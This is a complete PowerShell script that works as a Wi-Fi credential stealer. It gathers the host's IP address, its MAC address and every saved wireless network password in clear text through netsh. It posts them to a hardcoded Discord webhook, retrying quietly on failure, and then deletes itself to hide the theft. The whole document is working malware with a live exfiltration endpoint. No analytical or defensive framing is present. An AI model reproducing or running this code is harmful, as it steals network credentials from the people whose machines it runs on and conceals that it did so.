$webhook = 'https://discord.com/api/webhooks/1366448699399737384/9t26EIV2kKQCNtTNoADSPuBKMr9PCR21loACGl-2bkUVOVUpKvNGdJTS_4jE2lFnLSCb'

function Send-Data {
    param([string]$content)
    $tries = 0
    $maxTries = 5
    while ($tries -lt $maxTries) {
        try {
            Invoke-RestMethod -Uri $webhook -Method POST -Body (@{content=$content} | ConvertTo-Json -Depth 3) -ContentType 'application/json'
            break
        } catch {
            $tries++
            Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
        }
    }
}

try {
    $IP = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4" -and $_.PrefixOrigin -eq "Dhcp"} | Select-Object -First 1 -ExpandProperty IPAddress)
    $MESSAGE = "COMMING FROM: $IP`n`n--------------------`n`n"

    $MAC = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1 -ExpandProperty MacAddress)
    if ($MAC) {
        $MESSAGE += "MAC ADDRESS: $MAC`n"
    } else {
        $MESSAGE += "MAC ADDRESS: N/A`n"
    }

    $firstNetwork = $true

    $wifiProfiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { ($_ -split ':')[1].Trim() }
    foreach ($profile in $wifiProfiles) {
        if (-not $firstNetwork) {
            $MESSAGE += "`n--------------------`n`n"
        }
        $key = (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ':')[1].Trim() })
        if (-not $key) { $key = "None" }
        $MESSAGE += "NETWORK: $profile`nPASSWORD: $key`n"
        $firstNetwork = $false
    }

    $ethernetProfile = Get-NetConnectionProfile | Where-Object {$_.NetworkCategory -eq "Private" -or $_.NetworkCategory -eq "DomainAuthenticated"}
    if ($ethernetProfile -and $ethernetProfile.InterfaceAlias -like "*Ethernet*") {
        if (-not $firstNetwork -or $wifiProfiles.Count -gt 0) {
            $MESSAGE += "`n--------------------`n`n"
        }

        $MESSAGE += "NETWORK: Ethernet (Connected)`nPASSWORD: N/A (Ethernet)`n"
        if ($firstNetwork -and $wifiProfiles.Count -eq 0) {
            $firstNetwork = $false
        }
    }

    Send-Data -content $MESSAGE
} catch {}

$myPath = $MyInvocation.MyCommand.Definition
Start-Sleep -Seconds 2
Remove-Item $myPath -Force